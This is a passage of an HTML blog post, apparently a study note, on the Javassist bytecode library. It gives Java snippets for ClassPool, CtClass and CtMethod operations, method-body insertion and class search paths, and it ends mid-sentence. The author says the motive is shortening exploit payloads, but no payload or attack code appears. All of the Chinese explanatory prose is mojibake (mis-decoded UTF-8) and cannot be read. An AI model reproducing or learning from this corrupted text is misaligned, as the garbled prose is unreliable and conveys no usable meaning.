        <content type="html"><![CDATA[<p>å› ä¸ºçœ‹åˆ°åœ¨ç¼©çŸ­payloadçš„æ—¶å€™ä¼šç”¨åˆ°ï¼Œèµ¶ç´§æ¥å­¦ä¹ ä¸€ä¸‹ï¼Œå‚è€ƒæ–‡ç« ï¼š<a href="https://www.yishuifengxiao.com/2023/04/04/javassist%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/">https://www.yishuifengxiao.com/2023/04/04/javassist%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/</a></p><p>è¿™æ˜¯å®˜æ–¹æ–‡æ¡£ï¼š<a href="http://www.javassist.org/tutorial/tutorial.html">http://www.javassist.org/tutorial/tutorial.html</a></p><h1 id="javassistä»‹ç»"><a href="#javassistä»‹ç»" class="headerlink" title="javassistä»‹ç»"></a>javassistä»‹ç»</h1><p>Javassist æ˜¯ä¸€ä¸ªå¼€æºçš„åˆ†æã€ç¼–è¾‘å’Œåˆ›å»ºJavaå­—èŠ‚ç çš„ç±»åº“.ï¼›å…¶ä¸»è¦ä¼˜ç‚¹åœ¨äºç®€å•å¿«é€Ÿ. ç›´æ¥ä½¿ç”¨ java ç¼–ç çš„å½¢å¼, è€Œä¸éœ€è¦äº†è§£è™šæ‹ŸæœºæŒ‡ä»¤, å°±èƒ½åŠ¨æ€æ”¹å˜ç±»çš„ç»“æ„, æˆ–è€…åŠ¨æ€ç”Ÿæˆç±»ã€‚</p><p>ä½¿ç”¨å‰å¯¼å…¥jaråŒ…</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!-- https://mvnrepository.com/artifact/org.javassist/javassist --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.javassist<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>javassist<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.28.0-GA<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>Javassistä¸­æœ€ä¸ºé‡è¦çš„æ˜¯<code>ClassPool</code>,<code>CtClass</code>, <code>CtMethod</code>ä»¥åŠ<code>CtField</code>è¿™å‡ ä¸ªç±».</p><ul><li><code>ClassPool</code>: ä¸€ä¸ªåŸºäº<code>Hashtable</code>å®ç°çš„<code>CtClass</code>å¯¹è±¡å®¹å™¨, å…¶ä¸­é”®æ˜¯ç±»åç§°, å€¼æ˜¯è¡¨ç¤ºè¯¥ç±»çš„<code>CtClass</code>å¯¹è±¡</li><li><code>CtClass</code>: <code>CtClass</code>è¡¨ç¤ºç±», ä¸€ä¸ª<code>CtClass</code>(ç¼–è¯‘æ—¶ç±»)å¯¹è±¡å¯ä»¥å¤„ç†ä¸€ä¸ªclassæ–‡ä»¶, è¿™äº›<code>CtClass</code>å¯¹è±¡å¯ä»¥ä»<code>ClassPool</code>è·å¾—</li><li><code>CtMethod</code>: è¡¨ç¤ºç±»ä¸­çš„æ–¹æ³•</li><li><code>CtField</code>: è¡¨ç¤ºç±»ä¸­çš„å­—æ®µ</li><li><code>CtConstructor</code>:å¯è¯»å†™çš„ç±»æ„é€ æ–¹æ³•å¯¹è±¡</li></ul><h1 id="classpoolç›¸å…³æ–¹æ³•"><a href="#ClassPoolç›¸å…³æ–¹æ³•" class="headerlink" title="ClassPoolç›¸å…³æ–¹æ³•"></a>ClassPoolç›¸å…³æ–¹æ³•</h1><ul><li><code>getDefault</code>: è¿”å›é»˜è®¤çš„<code>ClassPool</code>æ˜¯å•ä¾‹æ¨¡å¼çš„ï¼Œä¸€èˆ¬é€šè¿‡è¯¥æ–¹æ³•åˆ›å»ºæˆ‘ä»¬çš„<code>ClassPool</code>ï¼›</li><li><code>appendClassPath</code>, <code>insertClassPath</code> : å°†ä¸€ä¸ª<code>ClassPath</code>åŠ åˆ°ç±»æœç´¢è·¯å¾„çš„æœ«å°¾ä½ç½® æˆ– æ’å…¥åˆ°èµ·å§‹ä½ç½®ã€‚é€šå¸¸é€šè¿‡è¯¥æ–¹æ³•å†™å…¥é¢å¤–çš„ç±»æœç´¢è·¯å¾„ï¼Œä»¥è§£å†³å¤šä¸ªç±»åŠ è½½å™¨ç¯å¢ƒä¸­æ‰¾ä¸åˆ°ç±»çš„å°´å°¬ï¼›</li><li><code>toClass</code> : å°†ä¿®æ”¹åçš„<code>CtClass</code>åŠ è½½è‡³å½“å‰çº¿ç¨‹çš„ä¸Šä¸‹æ–‡ç±»åŠ è½½å™¨ä¸­ï¼Œ<code>CtClass</code>çš„<code>toClass</code>æ–¹æ³•æ˜¯é€šè¿‡è°ƒç”¨æœ¬æ–¹æ³•å®ç°ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ä¸€æ—¦è°ƒç”¨è¯¥æ–¹æ³•ï¼Œåˆ™æ— æ³•ç»§ç»­ä¿®æ”¹å·²ç»è¢«åŠ è½½çš„classï¼›</li><li><code>get</code> , <code>getCtClass</code>: æ ¹æ®ç±»è·¯å¾„åè·å–è¯¥ç±»çš„<code>CtClass</code>å¯¹è±¡ï¼Œç”¨äºåç»­çš„ç¼–è¾‘ã€‚</li></ul><p>ClassPoolå¯¹è±¡çš„åˆ›å»º</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// è·å–ClassPoolå¯¹è±¡, ä½¿ç”¨ç³»ç»Ÿé»˜è®¤ç±»è·¯å¾„</span><br><span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassPool</span>(<span class="hljs-literal">true</span>);<br><span class="hljs-comment">// æ•ˆæœä¸ new ClassPool(true) ä¸€è‡´ï¼Œåªä¸è¿‡è¿”å›çš„æ˜¯é»˜è®¤çš„å•ä¾‹æ¨¡å¼</span><br><span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool1</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br></code></pre></td></tr></table></figure><p>ä¸ºå‡å°‘ClassPoolå¯èƒ½å¯¼è‡´çš„å†…å­˜æ¶ˆè€—ï¼› å¯ä»¥ä»ClassPoolä¸­åˆ é™¤ä¸å¿…è¦çš„CtClasså¯¹è±¡. æˆ–è€…æ¯æ¬¡åˆ›å»ºæ–°çš„ClassPoolå¯¹è±¡ã€‚</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// ä»ClassPoolä¸­åˆ é™¤CtClasså¯¹è±¡</span><br>ctClass.detach();<br><span class="hljs-comment">// ä¹Ÿå¯ä»¥æ¯æ¬¡åˆ›å»ºä¸€ä¸ªæ–°çš„ClassPool, è€Œä¸æ˜¯ClassPool.getDefault(), é¿å…å†…å­˜æº¢å‡º</span><br><span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassPool</span>(<span class="hljs-literal">true</span>);<br></code></pre></td></tr></table></figure><h1 id="ctclassç›¸å…³æ–¹æ³•"><a href="#CtClassç›¸å…³æ–¹æ³•" class="headerlink" title="CtClassç›¸å…³æ–¹æ³•"></a>CtClassç›¸å…³æ–¹æ³•</h1><ul><li>freeze: å†»ç»“ä¸€ä¸ªç±»ï¼Œä½¿å…¶ä¸å¯ä¿®æ”¹ï¼›</li><li>isFrozen : åˆ¤æ–­ä¸€ä¸ªç±»æ˜¯å¦å·²è¢«å†»ç»“ï¼›</li><li>prune : åˆ é™¤ç±»ä¸å¿…è¦çš„å±æ€§ï¼Œä»¥å‡å°‘å†…å­˜å ç”¨ã€‚è°ƒç”¨è¯¥æ–¹æ³•åï¼Œè®¸å¤šæ–¹æ³•æ— æ³•å°†æ— æ³•æ­£å¸¸ä½¿ç”¨ï¼Œæ…ç”¨ï¼›</li><li>defrost : è§£å†»ä¸€ä¸ªç±»ï¼Œä½¿å…¶å¯ä»¥è¢«ä¿®æ”¹ã€‚å¦‚æœäº‹å…ˆçŸ¥é“ä¸€ä¸ªç±»ä¼šè¢«defrostï¼Œ åˆ™ç¦æ­¢è°ƒç”¨ prune æ–¹æ³•ï¼›</li><li>detach : å°†è¯¥classä»ClassPoolä¸­åˆ é™¤ï¼›</li><li>writeFile : æ ¹æ®CtClassç”Ÿæˆ .class æ–‡ä»¶ï¼›</li><li>toClass : é€šè¿‡ç±»åŠ è½½å™¨åŠ è½½è¯¥CtClassã€‚</li><li>setInterfaces: æ·»åŠ çˆ¶æ¥å£</li><li>setSuperclass: æ·»åŠ çˆ¶ç±»</li></ul><h2 id="è·å–ctclass"><a href="#è·å–CtClass" class="headerlink" title="è·å–CtClass"></a>è·å–CtClass</h2><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass</span> <span class="hljs-operator">=</span> classPool.get(<span class="hljs-string">&quot;org.clown.ssist.Student&quot;</span>);<span class="hljs-comment">//æœªè·å–åˆ°ç±»æˆ–æŠ›å¼‚å¸¸</span><br><span class="hljs-comment">// é€šè¿‡ç±»åè·å– CtClass, æœªæ‰¾åˆ°è¿”å› null, ä¸ä¼šæŠ›å‡ºå¼‚å¸¸</span><br><span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass1</span> <span class="hljs-operator">=</span> pool.getOrNull(<span class="hljs-string">&quot;org.clown.ssist.Student&quot;</span>);<br>ctClass.freeze();<span class="hljs-comment">//å†»ç»“ç±»ï¼Œå³ä¸èƒ½ä¿®æ”¹</span><br>System.out.println(ctClass.isFrozen());<span class="hljs-comment">//æ£€æŸ¥æ˜¯å¦å†»ç»“ï¼Œå³ä¸å¯ä¿®æ”¹</span><br></code></pre></td></tr></table></figure><h2 id="åˆ›å»ºctclass"><a href="#åˆ›å»ºCtClass" class="headerlink" title="åˆ›å»ºCtClass"></a>åˆ›å»ºCtClass</h2><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// å¤åˆ¶ä¸€ä¸ªç±»</span><br><span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass2</span> <span class="hljs-operator">=</span> pool.getAndRename(<span class="hljs-string">&quot;org.clown.ssist.Student&quot;</span>, <span class="hljs-string">&quot;org.clown.ssist.Teacher&quot;</span>);<br><span class="hljs-comment">// åˆ›å»ºä¸€ä¸ªæ–°ç±»</span><br><span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass3</span> <span class="hljs-operator">=</span> pool.makeClass(<span class="hljs-string">&quot;org.clown.ssist.Student&quot;</span>);<br><span class="hljs-comment">// é€šè¿‡classæ–‡ä»¶åˆ›å»ºä¸€ä¸ªæ–°ç±»</span><br><span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass4</span> <span class="hljs-operator">=</span> classPool.makeClass(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(<span class="hljs-string">&quot;target/classes/org/clown/ssist/Student.class&quot;</span>)));<br></code></pre></td></tr></table></figure><p>åˆ›å»ºä¸€ä¸ªç±»ç„¶åå†™å…¥</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//åˆ›å»ºæ–°ç±»å¹¶å†™å…¥</span><br><span class="hljs-type">ClassPool</span> <span class="hljs-variable">cp</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br><span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass</span> <span class="hljs-operator">=</span> cp.makeClass(<span class="hljs-string">&quot;Temp.Hello&quot;</span>);<br>ctClass.writeFile();<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202409071508005.png" alt="image-20240907150758908"></p><p>ç„¶åå°±ä¼šæ ¹æ®åç§°ä¿å­˜åˆ°å¯¹åº”çš„ç›®å½•ä¸‹ï¼Œå°†ç±»æŒä¹…åŒ–äº†åˆ°æ–‡ä»¶ä¸­</p><h2 id="ctclassåŸºç¡€ä¿¡æ¯"><a href="#CtClassåŸºç¡€ä¿¡æ¯" class="headerlink" title="CtClassåŸºç¡€ä¿¡æ¯"></a>CtClassåŸºç¡€ä¿¡æ¯</h2><p>å°±æ˜¯ä¸€äº›ç±»çš„å„ç§åŸºç¡€ä¿¡æ¯ï¼Œç±»å…¨åã€ç±»æ–¹æ³•ã€ç±»å­—æ®µç­‰</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// ç±»å</span><br><span class="hljs-type">String</span> <span class="hljs-variable">simpleName</span> <span class="hljs-operator">=</span> ctClass.getSimpleName();<br><span class="hljs-comment">// ç±»å…¨å</span><br><span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> ctClass.getName();<br><span class="hljs-comment">// åŒ…å</span><br><span class="hljs-type">String</span> <span class="hljs-variable">packageName</span> <span class="hljs-operator">=</span> ctClass.getPackageName();<br><span class="hljs-comment">// æ¥å£</span><br>CtClass[] interfaces = ctClass.getInterfaces();<br><span class="hljs-comment">// ç»§æ‰¿ç±»</span><br><span class="hljs-type">CtClass</span> <span class="hljs-variable">superclass</span> <span class="hljs-operator">=</span> ctClass.getSuperclass();<br><span class="hljs-comment">// è·å–ç±»æ–¹æ³•</span><br><span class="hljs-type">CtMethod</span> <span class="hljs-variable">ctMethod</span> <span class="hljs-operator">=</span> ctClass.getDeclaredMethod(<span class="hljs-string">&quot;getName()&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">CtClass</span>[] &#123;pool.get(String.class.getName()), pool.get(String.class.getName())&#125;);<br><span class="hljs-comment">// è·å–ç±»å­—æ®µ</span><br><span class="hljs-type">CtField</span> <span class="hljs-variable">ctField</span> <span class="hljs-operator">=</span> ctClass.getField(<span class="hljs-string">&quot;name&quot;</span>);<br><span class="hljs-comment">// åˆ¤æ–­æ•°ç»„ç±»å‹</span><br>ctClass.isArray();<br><span class="hljs-comment">// åˆ¤æ–­åŸç”Ÿç±»å‹</span><br>ctClass.isPrimitive();<br><span class="hljs-comment">// åˆ¤æ–­æ¥å£ç±»å‹</span><br>ctClass.isInterface();<br><span class="hljs-comment">// åˆ¤æ–­æšä¸¾ç±»å‹</span><br>ctClass.isEnum();<br><span class="hljs-comment">// åˆ¤æ–­æ³¨è§£ç±»å‹</span><br>ctClass.isAnnotation();<br><span class="hljs-comment">// å†»ç»“ä¸€ä¸ªç±»ï¼Œä½¿å…¶ä¸å¯ä¿®æ”¹</span><br>ctClass.freeze () <br><span class="hljs-comment">// åˆ¤æ–­ä¸€ä¸ªç±»æ˜¯å¦å·²è¢«å†»ç»“</span><br>ctClass.isFrozen()<br><span class="hljs-comment">// åˆ é™¤ç±»ä¸å¿…è¦çš„å±æ€§ï¼Œä»¥å‡å°‘å†…å­˜å ç”¨ã€‚è°ƒç”¨è¯¥æ–¹æ³•åï¼Œè®¸å¤šæ–¹æ³•æ— æ³•å°†æ— æ³•æ­£å¸¸ä½¿ç”¨ï¼Œæ…ç”¨</span><br>ctClass.prune() <br><span class="hljs-comment">//è§£å†»ä¸€ä¸ªç±»ï¼Œä½¿å…¶å¯ä»¥è¢«ä¿®æ”¹ã€‚å¦‚æœäº‹å…ˆçŸ¥é“ä¸€ä¸ªç±»ä¼šè¢«defrostï¼Œ åˆ™ç¦æ­¢è°ƒç”¨pruneæ–¹æ³•</span><br>ctClass.defrost()<br></code></pre></td></tr></table></figure><h2 id="å¯¹ctclassè¿›è¡Œæ“ä½œ"><a href="#å¯¹CtClassè¿›è¡Œæ“ä½œ" class="headerlink" title="å¯¹CtClassè¿›è¡Œæ“ä½œ"></a>å¯¹CtClassè¿›è¡Œæ“ä½œ</h2><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// æ·»åŠ æ¥å£</span><br>ctClass.addInterface(...);<br><span class="hljs-comment">// æ·»åŠ æ„é€ å™¨</span><br>ctClass.addConstructor(...);<br><span class="hljs-comment">// æ·»åŠ å­—æ®µ</span><br>ctClass.addField(...);<br><span class="hljs-comment">// æ·»åŠ æ–¹æ³•</span><br>ctClass.addMethod(...);<br></code></pre></td></tr></table></figure><h2 id="ctclassç¼–è¯‘"><a href="#CtClassç¼–è¯‘" class="headerlink" title="CtClassç¼–è¯‘"></a>CtClassç¼–è¯‘</h2><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// è·å–å­—èŠ‚ç æ–‡ä»¶ éœ€è¦æ³¨æ„çš„æ˜¯ä¸€æ—¦è°ƒç”¨è¯¥æ–¹æ³•ï¼Œåˆ™æ— æ³•ç»§ç»­ä¿®æ”¹å·²ç»è¢«åŠ è½½çš„class</span><br><span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> ctClass.toClass();<br><span class="hljs-comment">// ç±»çš„å­—èŠ‚ç æ–‡ä»¶</span><br><span class="hljs-type">ClassFile</span> <span class="hljs-variable">classFile</span> <span class="hljs-operator">=</span> ctClass.getClassFile();<br><span class="hljs-comment">// ç¼–è¯‘æˆå­—èŠ‚ç æ–‡ä»¶, ä½¿ç”¨å½“å‰çº¿ç¨‹ä¸Šä¸‹æ–‡ç±»åŠ è½½å™¨åŠ è½½ç±», å¦‚æœç±»å·²å­˜åœ¨æˆ–è€…ç¼–è¯‘å¤±è´¥å°†æŠ›å‡ºå¼‚å¸¸</span><br><span class="hljs-type">byte</span>[] bytes = ctClass.toBytecode();<br></code></pre></td></tr></table></figure><h1 id="ctmethodç›¸å…³æ–¹æ³•"><a href="#CtMethodç›¸å…³æ–¹æ³•" class="headerlink" title="CtMethodç›¸å…³æ–¹æ³•"></a>CtMethodç›¸å…³æ–¹æ³•</h1><p><code>CtMthod</code>ä»£è¡¨ç±»ä¸­çš„æŸä¸ªæ–¹æ³•ï¼Œå¯ä»¥é€šè¿‡<code>CtClass</code>æä¾›çš„APIè·å–æˆ–è€…<code>CtNewMethod</code>æ–°å»ºï¼Œé€šè¿‡<code>CtMethod</code>å¯¹è±¡å¯ä»¥å®ç°å¯¹æ–¹æ³•çš„ä¿®æ”¹ã€‚</p><p>CtNewMethodæœ‰ç‚¹ç±»ä¼¼ä¸€ä¸ªå·¥å…·ç±»ï¼Œé‡Œé¢çš„æ–¹æ³•éƒ½æ˜¯é™æ€æ–¹æ³•ï¼Œæ¯”å¦‚ç”Ÿæˆä¸€ä¸ªæ–°çš„CtMethod</p><p><img src="https://cdn.clown2024.cn/202409060034713.png" alt="image-20240906003402632"></p><ul><li><p>insertBefore : åœ¨æ–¹æ³•çš„èµ·å§‹ä½ç½®æ’å…¥ä»£ç ï¼›</p></li><li><p>insterAfter : åœ¨æ–¹æ³•çš„æ‰€æœ‰ return è¯­å¥å‰æ’å…¥ä»£ç ä»¥ç¡®ä¿è¯­å¥èƒ½å¤Ÿè¢«æ‰§è¡Œï¼Œé™¤éé‡åˆ°exceptionï¼›</p></li><li><p>insertAt : åœ¨æŒ‡å®šçš„ä½ç½®æ’å…¥ä»£ç ï¼›</p></li><li><p>setBody: å°†æ–¹æ³•çš„å†…å®¹è®¾ç½®ä¸ºè¦å†™å…¥çš„ä»£ç ï¼Œå½“æ–¹æ³•è¢« abstractä¿®é¥°æ—¶ï¼Œè¯¥ä¿®é¥°ç¬¦è¢«ç§»é™¤ï¼›</p></li><li><p>make : åˆ›å»ºä¸€ä¸ªæ–°çš„æ–¹æ³•ï¼Œæœ¬è´¨å°±æ˜¯è°ƒç”¨CtNewMethod#make</p><p><img src="https://cdn.clown2024.cn/202409060035377.png" alt="image-20240906003533328"></p></li></ul><h2 id="ctmethodå±æ€§è·å–"><a href="#CtMethodå±æ€§è·å–" class="headerlink" title="CtMethodå±æ€§è·å–"></a>CtMethodå±æ€§è·å–</h2><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass5</span> <span class="hljs-operator">=</span> pool.get(TestService.class.getName());<br><span class="hljs-type">CtMethod</span> <span class="hljs-variable">ctMethod</span> <span class="hljs-operator">=</span> ctClass5.getDeclaredMethod(<span class="hljs-string">&quot;selectOrder&quot;</span>);<br><span class="hljs-comment">// æ–¹æ³•å</span><br><span class="hljs-type">String</span> <span class="hljs-variable">methodName</span> <span class="hljs-operator">=</span> ctMethod.getName();<br><span class="hljs-comment">// è¿”å›ç±»å‹</span><br><span class="hljs-type">CtClass</span> <span class="hljs-variable">returnType</span> <span class="hljs-operator">=</span> ctMethod.getReturnType();<br><span class="hljs-comment">// æ–¹æ³•å‚æ•°, é€šè¿‡æ­¤ç§æ–¹å¼å¾—åˆ°æ–¹æ³•å‚æ•°åˆ—è¡¨</span><br><span class="hljs-comment">// æ ¼å¼: com.kawa.TestService.getOrder(java.lang.String,java.util.List)</span><br>ctMethod.getLongName();<br><span class="hljs-comment">// æ–¹æ³•ç­¾å æ ¼å¼: (Ljava/lang/String;Ljava/util/List;Lcom/test/Order;)Ljava/lang/Integer;</span><br>ctMethod.getSignature();<br><br><span class="hljs-comment">// è·å–æ–¹æ³•å‚æ•°åç§°, å¯ä»¥é€šè¿‡è¿™ç§æ–¹å¼å¾—åˆ°æ–¹æ³•çœŸå®å‚æ•°åç§°</span><br>List&lt;String&gt; argKeys = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();<br><span class="hljs-type">MethodInfo</span> <span class="hljs-variable">methodInfo</span> <span class="hljs-operator">=</span> ctMethod.getMethodInfo();<br><span class="hljs-type">CodeAttribute</span> <span class="hljs-variable">codeAttribute</span> <span class="hljs-operator">=</span> methodInfo.getCodeAttribute();<br><span class="hljs-type">LocalVariableAttribute</span> <span class="hljs-variable">attr</span> <span class="hljs-operator">=</span> (LocalVariableAttribute) codeAttribute.getAttribute(LocalVariableAttribute.tag);<br><span class="hljs-type">int</span> <span class="hljs-variable">len</span> <span class="hljs-operator">=</span> ctMethod.getParameterTypes().length;<br><span class="hljs-comment">// éé™æ€çš„æˆå‘˜å‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯this</span><br><span class="hljs-type">int</span> <span class="hljs-variable">pos</span> <span class="hljs-operator">=</span> Modifier.isStatic(ctMethod.getModifiers()) ? <span class="hljs-number">0</span> : <span class="hljs-number">1</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> pos; i &lt; len; i++) &#123;<br>    argKeys.add(attr.variableName(i));<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="ctmethodæ–¹æ³•ä½“ä¿®æ”¹"><a href="#CtMethodæ–¹æ³•ä½“ä¿®æ”¹" class="headerlink" title="CtMethodæ–¹æ³•ä½“ä¿®æ”¹"></a>CtMethodæ–¹æ³•ä½“ä¿®æ”¹</h2><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// åœ¨æ–¹æ³•ä½“å‰æ’å…¥ä»£ç å—</span><br>ctMethod.insertBefore(<span class="hljs-string">&quot;&quot;</span>);<br><span class="hljs-comment">// åœ¨æ–¹æ³•ä½“åæ’å…¥ä»£ç å—</span><br>ctMethod.insertAfter(<span class="hljs-string">&quot;&quot;</span>);<br><span class="hljs-comment">// åœ¨æŸè¡Œ å­—èŠ‚ç  åæ’å…¥ä»£ç å—</span><br>ctMethod.insertAt(<span class="hljs-number">10</span>, <span class="hljs-string">&quot;&quot;</span>);<br><span class="hljs-comment">// æ·»åŠ å‚æ•°</span><br>ctMethod.addParameter(CtClass);<br><span class="hljs-comment">// è®¾ç½®æ–¹æ³•å</span><br>ctMethod.setName(<span class="hljs-string">&quot;newName&quot;</span>);<br><span class="hljs-comment">// è®¾ç½®æ–¹æ³•ä½“ $0=this / $1,$2,$3... ä»£è¡¨æ–¹æ³•å‚æ•°</span><br>ctMethod.setBody(<span class="hljs-string">&quot;&#123;$0.name = $1;&#125;&quot;</span>);<br><span class="hljs-comment">//åˆ›å»ºä¸€ä¸ªæ–°çš„æ–¹æ³•</span><br>ctMethod.make(<span class="hljs-string">&quot;kawa&quot;</span>,CtClass);<br></code></pre></td></tr></table></figure><h2 id="å¼‚å¸¸å—æ·»åŠ "><a href="#å¼‚å¸¸å—æ·»åŠ " class="headerlink" title="å¼‚å¸¸å—æ·»åŠ "></a>å¼‚å¸¸å—æ·»åŠ </h2><p>åœ¨æ–¹æ³•ä¸­åŠ å…¥try catchå—, éœ€è¦æ³¨æ„çš„æ˜¯, å¿…é¡»åœ¨æ’å…¥çš„ä»£ç ä¸­, åŠ å…¥returnå€¼$eä»£è¡¨å¼‚å¸¸ä¿¡æ¯.æ’å…¥çš„ä»£ç ç‰‡æ®µå¿…é¡»ä»¥throwæˆ–returnè¯­å¥ç»“æŸ</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-type">CtMethod</span> <span class="hljs-variable">m</span> <span class="hljs-operator">=</span> ...;<br><span class="hljs-type">CtClass</span> <span class="hljs-variable">etype</span> <span class="hljs-operator">=</span> ClassPool.getDefault().get(<span class="hljs-string">&quot;java.io.IOException&quot;</span>);<br>m.addCatch(<span class="hljs-string">&quot;&#123; System.out.println($e); throw $e; &#125;&quot;</span>, etype);<br><span class="hljs-comment">// ç­‰åŒäºæ·»åŠ å¦‚ä¸‹ä»£ç : </span><br><span class="hljs-keyword">try</span> &#123;<br>    <span class="hljs-comment">// the original method body</span><br>&#125; <span class="hljs-keyword">catch</span> (java.io.IOException e) &#123;<br>    System.out.println(e);<br>    <span class="hljs-keyword">throw</span> e;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="ç±»æœç´¢è·¯å¾„"><a href="#ç±»æœç´¢è·¯å¾„" class="headerlink" title="ç±»æœç´¢è·¯å¾„"></a>ç±»æœç´¢è·¯å¾„</h1><p>æˆ‘ä»¬å‰é¢è·å–çš„ClassPoolä»–æœ‰è‡ªå·±çš„ç±»æœç´¢è·¯å¾„ï¼Œå¦‚æœç¨‹åºè¿è¡Œåœ¨JBossæˆ–Tomcatç­‰webæœåŠ¡å™¨ä¸Šï¼Œå¯èƒ½ä¼šæ‰¾ä¸åˆ°ç”¨æˆ·è‡ªå·±çš„ç±»ï¼Œæˆ‘ä»¬éœ€è¦æ‰‹åŠ¨æ·»åŠ ä¸€ä¸ªç±»æœç´¢è·¯å¾„ã€‚</p><p>ä¸‹é¢æ˜¯å„ç§æ·»åŠ ç±»æœç´ è·¯å¾„çš„å„ç§æ–¹å¼</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/*é€šè¿‡ClassClassPathæ·»åŠ è·¯å¾„*/</span><br><span class="hljs-comment">// å°†classpathæ’å…¥åˆ°æŒ‡å®šclasspathä¹‹å‰</span><br>pool.insertClassPath(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassClassPath</span>(Student.getClass()));<br><span class="hljs-comment">// å°†classpathæ·»åŠ åˆ°æŒ‡å®šclasspathä¹‹å</span><br>pool.appendClassPath(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassClassPath</span>(<span class="hljs-built_in">this</span>.getClass()));<br></code></pre></td></tr></table></figure><blockquote><p>è¯¥æ–¹å¼æ·»åŠ çš„æ—¶å€™ï¼Œæ¯”å¦‚ä¸Šé¢çš„Student.classï¼Œå¯ä»¥å°†classæ‰€åœ¨çš„æ•´ä¸ªjaræ·»åŠ åˆ°æœç´¢è·¯å¾„</p></blockquote><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/*æŒ‡å®šç›®å½•æ·»åŠ æœç´¢è·¯å¾„*/</span><br><span class="hljs-comment">// å°†ä¸€ä¸ªç›®å½•ä½œä¸ºclasspath</span><br>pool.insertClassPath(<span class="hljs-string">&quot;/xxx/lib&quot;</span>);<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/*é€šè¿‡urlæŒ‡å®šæœç´¢è·¯å¾„*/</span><br><span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br><span class="hljs-type">ClassPath</span> <span class="hljs-variable">cp</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URLClassPath</span>(<span class="hljs-string">&quot;www.sample.com&quot;</span>, <span class="hljs-number">80</span>, <span class="hljs-string">&quot;/out/&quot;</span>, <span class="hljs-string">&quot;com.test&quot;</span>);<br>pool.insertClassPath(cp);<br></code></pre></td></tr></table></figure><blockquote><p>ä¸Šè¿°ä»£ç å°†<a href="http://www.sample.com/out%E6%B7%BB%E5%8A%A0%E5%88%B0%E7%B1%BB%E6%90%9C%E7%B4%A2%E8%B7%AF%E5%BE%84%E3%80%82%E5%B9%B6%E4%B8%94%E8%BF%99%E4%B8%AAURL%E5%8F%AA%E8%83%BD%E6%90%9C%E7%B4%A2%60com.test%60%E5%8C%85%E9%87%8C%E9%9D%A2%E7%9A%84%E7%B1%BB%E3%80%82">http://www.sample.com:80/outæ·»åŠ 